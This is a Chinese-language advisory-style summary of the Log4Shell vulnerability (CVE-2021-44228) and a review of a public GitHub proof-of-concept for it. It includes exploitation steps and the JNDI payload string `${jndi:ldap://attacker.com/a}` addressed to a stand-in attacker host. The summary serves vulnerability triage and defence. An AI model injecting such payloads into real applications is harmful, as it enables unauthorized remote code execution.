## CVE-2021-44228 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j版本，并且允许记录用户可控的输入，同时启用消息查找替换。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个存在于Apache Log4j2中的严重漏洞。该漏洞允许攻击者通过向日志消息或日志消息参数中注入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/a}`，来执行任意代码。当Log4j2处理包含该字符串的日志消息时，它会尝试通过JNDI从攻击者控制的LDAP服务器检索Java对象。如果JVM配置允许，该对象将被反序列化并执行，从而导致远程代码执行。

**利用方式：**
1.  攻击者识别使用Log4j2且记录用户可控输入的应用程序。
2.  攻击者构造包含恶意JNDI查找的payload，并将其注入到应用程序可以记录的任何输入字段中（例如，HTTP头、表单参数等）。
3.  当应用程序记录包含恶意payload的输入时，Log4j2会尝试解析JNDI查找。
4.  Log4j2向攻击者控制的LDAP服务器发出请求。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的引用。
6.  应用程序下载并执行恶意Java类，从而允许攻击者在目标系统上执行任意代码。

**评估POC代码：**
提供的PoC代码包含一个Dockerfile和Makefile，用于演示和利用CVE-2021-44228漏洞。Makefile包含用于构建Docker容器、启动/停止应用程序、触发漏洞利用和修补受害者应用程序的命令。`make exploit` 命令使用curl发送一个包含恶意JNDI payload的HTTP请求，该payload的目标是`${jndi:ldap://$(LHOST):$(LPORT)/a}`。该代码有效演示了漏洞利用。

**投毒风险：**
虽然PoC代码本身旨在演示和利用该漏洞，但任何从不受信任的来源下载的代码都存在潜在的风险。在本例中，投毒风险较低（约为10%），因为代码相对简单且易于审查。需要注意的是，Makefile的`exploit`命令和docker-compose.yml 中涉及的镜像如果被篡改，可能会引入恶意行为。用户应仔细检查所有代码，尤其是与网络连接和代码执行相关的部分，然后再执行PoC。代码中提供的Exploit.class ，本身就是一个后门代码,务必不要把POC验证的后门代码判定为投毒代码。docker-compose.yml 中涉及的镜像需要人工review.

**项目地址:** [arabindadora/log4shell](https://github.com/arabindadora/log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)